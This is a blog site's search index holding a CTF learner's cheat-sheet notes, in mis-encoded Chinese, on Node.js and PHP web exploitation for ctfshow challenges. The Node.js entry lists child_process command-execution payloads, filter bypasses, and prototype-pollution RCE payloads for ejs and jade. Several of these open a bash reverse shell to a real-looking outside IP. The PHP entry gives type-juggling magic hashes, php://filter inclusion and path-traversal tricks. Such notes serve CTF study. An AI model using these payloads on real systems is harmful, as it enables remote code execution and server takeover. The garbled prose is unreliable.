<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>nodejs</title>
    <url>/2025/06/02/ctfshow/nodejs/</url>
    <content><![CDATA[<h1 id="è¯­æ³•å‡½æ•°"><a href="#è¯­æ³•å‡½æ•°" class="headerlink" title="è¯­æ³•å‡½æ•°:"></a>è¯­æ³•å‡½æ•°:</h1><h2 id="1-eval-å‡½æ•°"><a href="#1-eval-å‡½æ•°" class="headerlink" title="1.eval()å‡½æ•°:"></a>1.eval()å‡½æ•°:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‰§è¡Œ JS è¡¨è¾¾å¼/ä»£ç å­—ç¬¦ä¸²</span><br><span class="line">require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()     --æ™®é€šçš„ç”¨äºeval()</span><br><span class="line">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /app/routes/login.js&#x27;).toString()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>ç‰¹æ€§</th>
<th><code>eval()</code></th>
<th><code>child_process.exec()</code> &#x2F; <code>execSync()</code> ç­‰</th>
</tr>
</thead>
<tbody><tr>
<td>åŠŸèƒ½</td>
<td>æ‰§è¡Œ JS è¡¨è¾¾å¼&#x2F;ä»£ç å­—ç¬¦ä¸²</td>
<td>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè°ƒç”¨ shell</td>
</tr>
<tr>
<td>æ‰§è¡Œç¯å¢ƒ</td>
<td>JavaScript è¿è¡Œæ—¶</td>
<td>æ“ä½œç³»ç»Ÿ shellï¼ˆbash&#x2F;cmdï¼‰</td>
</tr>
<tr>
<td>æ•°æ®ç±»å‹</td>
<td>ä»… JS æ•°æ®ï¼ˆå­—ç¬¦ä¸²ã€å¯¹è±¡ç­‰ï¼‰</td>
<td>ä»»æ„ç³»ç»Ÿå‘½ä»¤è¾“å‡ºï¼ˆBuffer&#x2F;Stringï¼‰</td>
</tr>
<tr>
<td>è¿”å›å€¼</td>
<td>JS è¡¨è¾¾å¼çš„ç»“æœ</td>
<td>å­è¿›ç¨‹çš„è¾“å‡ºï¼ˆstdoutï¼‰</td>
</tr>
<tr>
<td>å®‰å…¨é£é™©</td>
<td>é«˜ â€”â€” ä»£ç æ³¨å…¥</td>
<td>é«˜ â€”â€” å‘½ä»¤æ³¨å…¥</td>
</tr>
<tr>
<td>CTFåˆ©ç”¨ç‚¹</td>
<td>SSTIã€æ¨¡æ¿æ³¨å…¥ç­‰å¯æ‹¼æ¥ JS è¡¨è¾¾å¼</td>
<td>æ–‡ä»¶ä¸Šä¼ åé…åˆæ‰§è¡Œï¼›å‘½ä»¤æ‹¼æ¥</td>
</tr>
<tr>
<td>é˜²å¾¡å»ºè®®</td>
<td>ç¦ç”¨ <code>eval</code>ï¼›ä½¿ç”¨æ²™ç®±æˆ– <code>vm</code> æ¨¡å—</td>
<td>å‚æ•°ç™½åå•ï¼›è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦</td>
</tr>
</tbody></table>
<h4 id="1-è¿‡æ»¤"><a href="#1-è¿‡æ»¤" class="headerlink" title="1.è¿‡æ»¤:"></a>1.è¿‡æ»¤:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(&#x27;child_process&#x27;)[&#x27;exe&#x27;+&#x27;cSync&#x27;](&#x27;ls&#x27;)</span><br><span class="line">require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;).stdout</span><br><span class="line">Buffer.from(input[, encoding])</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>input</td>
<td>è¦è½¬æ¢çš„æ•°æ®ï¼ˆå­—ç¬¦ä¸²æˆ–æ•°ç»„ï¼‰</td>
</tr>
<tr>
<td>encoding</td>
<td>ç¼–ç æ–¹å¼ï¼ˆå¸¸ç”¨æœ‰ï¼š<code>utf8</code>, <code>base64</code>, <code>hex</code>, <code>binary</code>ï¼‰</td>
</tr>
</tbody></table>
<h2 id="2-res-render-å‡½æ•°"><a href="#2-res-render-å‡½æ•°" class="headerlink" title="2.res.render()å‡½æ•°:"></a>2.res.render()å‡½æ•°:</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">render</span>(view, locals, callback)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>view</code></td>
<td>æ¨¡æ¿åç§°ï¼ˆä¸å¸¦æ‰©å±•åï¼‰ï¼Œå¦‚ <code>index</code></td>
</tr>
<tr>
<td><code>locals</code></td>
<td>ä¼ å…¥æ¨¡æ¿çš„æ•°æ®å¯¹è±¡ï¼Œå¦‚ <code>&#123;username: &#39;admin&#39;&#125;</code></td>
</tr>
<tr>
<td><code>callback</code>ï¼ˆå¯é€‰ï¼‰</td>
<td>å¦‚æœæä¾›ï¼Œåˆ™ä¸ä¼šè‡ªåŠ¨å‘é€å“åº”ï¼Œè€Œæ˜¯è¿”å› HTML å­—ç¬¦ä¸²</td>
</tr>
</tbody></table>
<h1 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“:"></a>åŸå‹é“¾æ±¡æŸ“:</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">èƒ½ä¿®æ”¹ <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>ï¼Œå°±èƒ½å½±å“æ‰€æœ‰å¯¹è±¡</span><br></pre></td></tr></table></figure>

<h2 id="1-Functon"><a href="#1-Functon" class="headerlink" title="1.Functon()():"></a>1.Functon()():</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ä¼ å…¥bashå»è¿è¡Œ   bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/<span class="number">139.224</span><span class="number">.54</span><span class="number">.229</span>/<span class="number">9090</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">æœ‰å¯èƒ½éœ€è¦ä¸¤æ¬¡bashï¼š bash -c \<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;</span></span><br><span class="line"><span class="string">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1&#x27;)</span></span><br><span class="line"><span class="string">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;&#x27;)</span></span><br></pre></td></tr></table></figure>

<h2 id="2-ejsçš„-rce"><a href="#2-ejsçš„-rce" class="headerlink" title="2.ejsçš„ rce:"></a>2.ejsçš„ rce:</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">payload</span>:</span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-jadeçš„rce"><a href="#3-jadeçš„rce" class="headerlink" title="3.jadeçš„rce:"></a>3.jadeçš„rce:</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Block&quot;</span>,<span class="string">&quot;nodes&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">æ³¨æ„:   <span class="title class_">Content</span>-<span class="title class_">Type</span>:application/json</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>phpç‰¹æ€§</title>
    <url>/2025/06/02/ctfshow/php%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<h2 id="phpç‰¹æ€§"><a href="#phpç‰¹æ€§" class="headerlink" title="phpç‰¹æ€§"></a>phpç‰¹æ€§</h2><h3 id="1-intvalå‡½æ•°"><a href="#1-intvalå‡½æ•°" class="headerlink" title="1.intvalå‡½æ•°:"></a>1.intvalå‡½æ•°:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å‡½æ•° <span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br><span class="line">                å¦‚æœæ•°å­—å‰åŠ ä¸€äº›å­—èŠ‚ï¼Œä¹Ÿä¸ä¼šå½±å“è¿›åˆ¶è½¬æ¢    ---æ¯”å¦‚+<span class="number">010574</span>ä¼šè¢«å½“æˆ<span class="number">8</span>è¿›åˆ¶æ¥è½¬æ¢</span><br><span class="line">                å¦‚æœ base æ˜¯ <span class="number">0</span>ï¼Œé€šè¿‡æ£€æµ‹ value çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š</span><br><span class="line">                å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† <span class="string">&quot;0x&quot;</span> (æˆ– <span class="string">&quot;0X&quot;</span>) çš„å‰ç¼€ï¼Œä½¿ç”¨ <span class="number">16</span> è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œ</span><br><span class="line">                å¦‚æœå­—ç¬¦ä¸²ä»¥ <span class="string">&quot;0b&quot;</span> (æˆ– <span class="string">&quot;0B&quot;</span>) å¼€å¤´ï¼Œä½¿ç”¨ <span class="number">2</span> è¿›åˆ¶ (<span class="keyword">binary</span>)ï¼›å¦åˆ™ï¼Œ</span><br><span class="line">                å¦‚æœå­—ç¬¦ä¸²ä»¥ <span class="string">&quot;0&quot;</span> å¼€å§‹ï¼Œä½¿ç”¨ <span class="number">8</span> è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œ</span><br><span class="line">                å°†ä½¿ç”¨ <span class="number">10</span> è¿›åˆ¶ (decimal)ã€‚</span><br><span class="line">é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ value çš„ <span class="keyword">int</span> æ•°å€¼ã€‚   --å¯ä»¥é€šè¿‡ç±»å‹è½¬æ¢</span><br><span class="line"><span class="title function_ invoke__">intval</span>() ä¸èƒ½ç”¨äº <span class="keyword">object</span>ï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› <span class="number">1</span>ã€‚       --ä½†æ˜¯é€šè¿‡urlï¼Œæ— æ³•ä¼ é€’ä¸€ä¸ªå¯¹è±¡</span><br><span class="line">æˆåŠŸæ—¶è¿”å› value çš„ <span class="keyword">integer</span> å€¼ï¼Œå¤±è´¥æ—¶è¿”å› <span class="number">0</span>ã€‚ ç©ºçš„ <span class="keyword">array</span> è¿”å› <span class="number">0</span>ï¼Œéç©ºçš„ <span class="keyword">array</span> è¿”å› <span class="number">1</span>ã€‚    --?c[]=<span class="number">1</span>;å°±æŠŠcå½“ä½œä¸€ä¸ªæ•°ç»„</span><br></pre></td></tr></table></figure>

<h3 id="2-v1-v2ï¼Œä½†md5-v1-md5-v2-sha1åŠ å¯†çš„ä¸€ç³»åˆ—é—®é¢˜"><a href="#2-v1-v2ï¼Œä½†md5-v1-md5-v2-sha1åŠ å¯†çš„ä¸€ç³»åˆ—é—®é¢˜" class="headerlink" title="2.v1!&#x3D;v2ï¼Œä½†md5(v1)&#x3D;&#x3D;md5(v2)&#x2F;sha1åŠ å¯†çš„ä¸€ç³»åˆ—é—®é¢˜"></a>2.v1!&#x3D;v2ï¼Œä½†md5(v1)&#x3D;&#x3D;md5(v2)&#x2F;sha1åŠ å¯†çš„ä¸€ç³»åˆ—é—®é¢˜</h3><h4 id="1-å¯¹äº-ä¸åœ¨æ„æ•°æ®ç±»å‹çš„æƒ…å†µ"><a href="#1-å¯¹äº-ä¸åœ¨æ„æ•°æ®ç±»å‹çš„æƒ…å†µ" class="headerlink" title="1.å¯¹äº&#x3D;&#x3D;ä¸åœ¨æ„æ•°æ®ç±»å‹çš„æƒ…å†µ:"></a>1.å¯¹äº&#x3D;&#x3D;ä¸åœ¨æ„æ•°æ®ç±»å‹çš„æƒ…å†µ:</h4><figure class="highlight php"><figcaption><span>md5</span></figcaption><table><tr><td class="code"><pre><span class="line">åœ¨phpä¸­ï¼Œå˜é‡éƒ½æ˜¯å¼±ç±»å‹çš„ï¼ˆå°±æ˜¯ä¸æŒ‡å®šç‰¹å®šæ•°æ®ç±»å‹çš„ï¼‰ï¼Œä½¿ç”¨<span class="keyword">if</span>åˆ¤ç­‰çš„æ—¶å€™è¦æ ¼å¤–å°å¿ƒï¼Œä½¿ç”¨ç‰¹æ®Šçš„å‚æ•°å¯èƒ½ä¼šä½¿æœ¬æ¥ä¸ç›¸ç­‰çš„<span class="keyword">if</span>åˆ¤æ–­ä½ç›¸ç­‰ </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;&#125; </span><br><span class="line">                                     ---ä¼ å…¥a=s1885207154aï¼Œb=s1836677006aäºŒè€…md5éƒ½æ˜¯<span class="number">0</span>eå¼€å¤´ï¼Œåœ¨phpä¸­<span class="number">0</span>eä¼šè¢«å½“åšç§‘å­¦è®¡æ•°æ³•ï¼Œå°±ç®—åé¢æœ‰å­—æ¯ï¼Œå…¶ç»“æœä¹Ÿæ˜¯<span class="number">0</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;<span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;&#125;</span><br><span class="line">                                     ---<span class="title function_ invoke__">md5</span>(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM) =&gt; <span class="number">0e269</span>ab12da27d79a6626d91f34ae849</span><br><span class="line">                                     ---<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM)) =&gt; <span class="number">0e48</span>d320b2a97ab295f5c4694759889f </span><br><span class="line">    </span><br><span class="line">å…¨å­—æ¯åŸå€¼:QNKCDZO              --<span class="number">0e830400451993494058024219903391</span></span><br><span class="line">å…¨æ•°å­—åŸå€¼:<span class="number">240610708</span>            --<span class="number">0e462097431906509019562988736854</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><figcaption><span>sha1</span></figcaption><table><tr><td class="code"><pre><span class="line">ä»¥ä¸‹å€¼åœ¨sha1åŠ å¯†åä»¥<span class="number">0</span>Eå¼€å¤´ï¼š</span><br><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line"><span class="number">0e1290633704</span></span><br><span class="line"><span class="number">10932435112</span></span><br></pre></td></tr></table></figure>



<p>2.å¯¹äº&#x3D;&#x3D;&#x3D;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">MD5è¿™ä¸ªå‡½æ•°å‘¢æœ‰ä¸ªæ¼æ´ï¼Œä¼ å…¥çš„å‚æ•°ä¸ºæ•°ç»„çš„æ—¶å€™ä¼šå‘ç”Ÿé”™è¯¯ï¼Œå¹¶è¿”å›<span class="literal">NULL</span>                                    </span><br></pre></td></tr></table></figure>

<h3 id="3-in-array-å‡½æ•°"><a href="#3-in-array-å‡½æ•°" class="headerlink" title="3.in_array()å‡½æ•°:"></a>3.in_array()å‡½æ•°:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">mixed</span> <span class="variable">$needle</span>, <span class="keyword">array</span> <span class="variable">$haystack</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">bool</span></span><br><span class="line">å¤§æµ·æé’ˆï¼Œåœ¨å¤§æµ·ï¼ˆhaystackï¼‰ä¸­æœç´¢é’ˆï¼ˆ needleï¼‰ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½® strict åˆ™ä½¿ç”¨å®½æ¾çš„æ¯”è¾ƒã€‚</span><br><span class="line">    --å¦‚æœæ²¡æœ‰ä½¿ç”¨ç¬¬ä¸‰ä¸ªå€¼strictï¼Œé‚£ä¹ˆneedleå¦‚æœä¸º<span class="number">1</span>.php åˆ™ä¹Ÿä¼šæˆåŠŸåŒ¹é…</span><br></pre></td></tr></table></figure>

<h3 id="4-Reflectionclassç±»"><a href="#4-Reflectionclassç±»" class="headerlink" title="4.Reflectionclassç±»:"></a>4.Reflectionclassç±»:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨ ReflectionClassï¼Œå¯ä»¥è·å–ç±»çš„å±æ€§ã€æ–¹æ³•ã€å¸¸é‡ã€çˆ¶ç±»ã€æ¥å£ç­‰ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥åŠ¨æ€åœ°è°ƒç”¨ç±»çš„æ„é€ å‡½æ•°æˆ–æ–¹æ³•ç­‰</span><br><span class="line"><span class="variable">$reflection</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;MyClass&#x27;</span>);</span><br><span class="line">                               ---<span class="keyword">echo</span> <span class="variable">$reflection</span>; å¯ä»¥å¾—åˆ°æ‰€æœ‰MyClassç±»çš„å…¨éƒ¨ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<h3 id="5-hex2binå‡½æ•°"><a href="#5-hex2binå‡½æ•°" class="headerlink" title="5.hex2binå‡½æ•°:"></a>5.hex2binå‡½æ•°:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">èµ‹å€¼ç¬¦å·=ä¼˜å…ˆçº§é«˜äº<span class="keyword">and</span>    </span><br><span class="line">                 --&amp;&amp; &gt; = &gt; <span class="keyword">and</span></span><br><span class="line">hex2bin         ---è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</span><br><span class="line">is_numericå‡½æ•°:   å¦‚æœä¼ å…¥çš„å‚æ•°åªæœ‰ä¸€ä¸ªeå­—æ¯ï¼Œåˆ™è¿”å›<span class="literal">true</span>---ç§‘å­¦è®¡æ•°æ³•ï¼Œå…¨æ˜¯æ•°å­—<span class="literal">true</span></span><br><span class="line">    <span class="meta">&lt;?=</span>`cat *`;   --è¿™ä¸ªå‘½ä»¤é€šè¿‡base64ï¼Œåœ¨bin2hexåï¼Œè¾“å‡ºåªæœ‰ä¸€ä¸ªeçš„æ•°å­—</span><br></pre></td></tr></table></figure>

<h3 id="6-ereg-å‡½æ•°-PHP-7-ä¸­è¢«ç§»é™¤"><a href="#6-ereg-å‡½æ•°-PHP-7-ä¸­è¢«ç§»é™¤" class="headerlink" title="6.ereg()å‡½æ•°(PHP 7 ä¸­è¢«ç§»é™¤)"></a>6.ereg()å‡½æ•°(PHP 7 ä¸­è¢«ç§»é™¤)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">eregå‡½æ•°å­˜åœ¨<span class="literal">NULL</span>æˆªæ–­æ¼æ´ï¼Œå¯¼è‡´äº†æ­£åˆ™è¿‡æ»¤è¢«ç»•è¿‡,æ‰€ä»¥å¯ä»¥ä½¿ç”¨%<span class="number">00</span>æˆªæ–­æ­£åˆ™åŒ¹é…</span><br></pre></td></tr></table></figure>

<h3 id="7-Exceptionç±»"><a href="#7-Exceptionç±»" class="headerlink" title="7.Exceptionç±»"></a>7.Exceptionç±»</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Exception</span>æ˜¯æ‰€æœ‰ç”¨æˆ·çº§å¼‚å¸¸çš„åŸºç±»</span><br><span class="line">                             --ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¼šæŠŠè¿”å›å€¼å½“ä½œé”™è¯¯ä¿¡æ¯è¾“å‡º</span><br></pre></td></tr></table></figure>

<h3 id="8-FilesystemIteratoræ–‡ä»¶ç³»ç»Ÿè¿­ä»£å™¨"><a href="#8-FilesystemIteratoræ–‡ä»¶ç³»ç»Ÿè¿­ä»£å™¨" class="headerlink" title="8.FilesystemIteratoræ–‡ä»¶ç³»ç»Ÿè¿­ä»£å™¨"></a>8.FilesystemIteratoræ–‡ä»¶ç³»ç»Ÿè¿­ä»£å™¨</h3> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">FilesystemIterator</span> æ˜¯ PHP ä¸­åŸºäº SPLï¼ˆStandard PHP Libraryï¼‰çš„ä¸€ä¸ªè¿­ä»£å™¨ç±»ï¼Œç”¨æ¥éå†æ–‡ä»¶ç³»ç»Ÿã€‚</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">getcwd</span>())</span><br><span class="line">                              ---ä¸¤ç§è®¿é—®å½“å‰ç›®å½•çš„æ–¹æ³•</span><br></pre></td></tr></table></figure>

<h3 id="9-å…¨å±€æ•°ç»„-GLOBALS"><a href="#9-å…¨å±€æ•°ç»„-GLOBALS" class="headerlink" title="9. å…¨å±€æ•°ç»„$GLOBALS"></a>9. å…¨å±€æ•°ç»„$GLOBALS</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å…¨å±€æ•°ç»„<span class="variable">$GLOBALS</span>ï¼šå¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$GLOBALS</span>)    --è¾“å‡ºå…¨éƒ¨ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<h3 id="10-proc-self-root"><a href="#10-proc-self-root" class="headerlink" title="10.&#x2F;proc&#x2F;self&#x2F;root"></a>10.&#x2F;proc&#x2F;self&#x2F;root</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/proc/<span class="built_in">self</span>/root æ˜¯ Linux ç³»ç»Ÿä¸­ä¸€ä¸ªç‰¹æ®Šçš„ç¬¦å·é“¾æ¥ï¼Œå®ƒå§‹ç»ˆæŒ‡å‘å½“å‰è¿›ç¨‹çš„æ ¹ç›®å½•ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="11-postä¼ å‚"><a href="#11-postä¼ å‚" class="headerlink" title="11.postä¼ å‚"></a>11.postä¼ å‚</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ç‰¹æ€§<span class="number">1</span>ï¼šè¢«getæˆ–è€…postä¼ å…¥çš„å˜é‡åï¼Œå¦‚æœå«æœ‰ ç©ºæ ¼ã€+ã€[ åˆ™ä¼šè¢«è½¬åŒ–ä¸º _</span><br><span class="line">ç‰¹æ€§<span class="number">2</span>ï¼šå°±æ˜¯å¦‚æœä¼ å…¥ [ ï¼Œå®ƒè¢«è½¬åŒ–ä¸º _ ä¹‹åï¼Œåé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ä¸ä¼šè¢«æ›¿æ¢  ---php8ä»¥å‰</span><br></pre></td></tr></table></figure>

<h3 id="12-ä¼ å‚æ—¶"><a href="#12-ä¼ å‚æ—¶" class="headerlink" title="12.ä¼ å‚æ—¶"></a>12.ä¼ å‚æ—¶</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&amp;<span class="number">1</span>=flag.php              --ç»•è¿‡å…³é”®å­—</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&amp;<span class="number">1</span>=php:<span class="comment">//filter/               --æ–‡ä»¶åŒ…å«</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="13-evalå‡½æ•°ä¸assertå‡½æ•°"><a href="#13-evalå‡½æ•°ä¸assertå‡½æ•°" class="headerlink" title="13.evalå‡½æ•°ä¸assertå‡½æ•°"></a>13.evalå‡½æ•°ä¸assertå‡½æ•°</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">éƒ½ç”¨äºæ‰§è¡Œphpå‡½æ•° </span><br></pre></td></tr></table></figure>

<h3 id="14-SERVER-â€˜argvâ€™"><a href="#14-SERVER-â€˜argvâ€™" class="headerlink" title="14.$_SERVER[â€˜argvâ€™]"></a>14.$_SERVER[â€˜argvâ€™]</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[â€˜argvâ€™][<span class="number">0</span>] å°±ç­‰äº <span class="variable">$_SERVER</span>[â€˜QUERY_STRINGâ€™]ï¼Œ<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>] å°±æ˜¯æŸ¥è¯¢ (query) çš„å­—ç¬¦ä¸²</span><br><span class="line">                                    ---URLä¸­ ? å·åé¢çš„åŸå§‹å‚æ•°å­—ç¬¦ä¸²ï¼ˆä¸è§£æï¼Œä¸è§£ç ï¼Œç›´æ¥æ‹¿åŸæ ·çš„ query <span class="keyword">string</span>ï¼‰ã€‚</span><br><span class="line">                                    ---éœ€è¦php.ini å¼€å¯äº†register_argc_argv é…ç½®é¡¹ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="15-extractå‡½æ•°"><a href="#15-extractå‡½æ•°" class="headerlink" title="15.extractå‡½æ•°"></a>15.extractå‡½æ•°</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨</span><br><span class="line">ä¸€ä¸ªå…³è”æ•°ç»„ã€‚æ­¤å‡½æ•°ä¼šå°†é”®åå½“ä½œå˜é‡åï¼Œå€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚ å¯¹æ¯ä¸ªé”®ï¼å€¼å¯¹éƒ½ä¼šåœ¨å½“å‰çš„ç¬¦å·è¡¨ä¸­å»ºç«‹å˜é‡</span><br><span class="line">    ---åªéœ€è¦é”®å€¼å¯¹å°±è¡Œäº†?..CTFSHOW..=CTFSHOW&amp;isVIP=<span class="number">1</span>,è¿™æ ·ä¹Ÿä¼šè§£æ              </span><br></pre></td></tr></table></figure>



<h3 id="16-gettextæ‹“å±•"><a href="#16-gettextæ‹“å±•" class="headerlink" title="16.gettextæ‹“å±•:"></a>16.gettextæ‹“å±•:</h3><figure class="highlight plaintext"><figcaption><span>hp</span></figcaption><table><tr><td class="code"><pre><span class="line">gettext()ç­‰ä»·äº_()</span><br><span class="line">      --ä½¿ç”¨gettext()ç›¸å½“äºecho </span><br></pre></td></tr></table></figure>

<h3 id="17-stripos-å‡½æ•°"><a href="#17-stripos-å‡½æ•°" class="headerlink" title="17.stripos()å‡½æ•°:"></a>17.stripos()å‡½æ•°:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰</span><br><span class="line">        --é…åˆç›®å½•ç©¿è¶Šä½¿ç”¨../../../../../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>

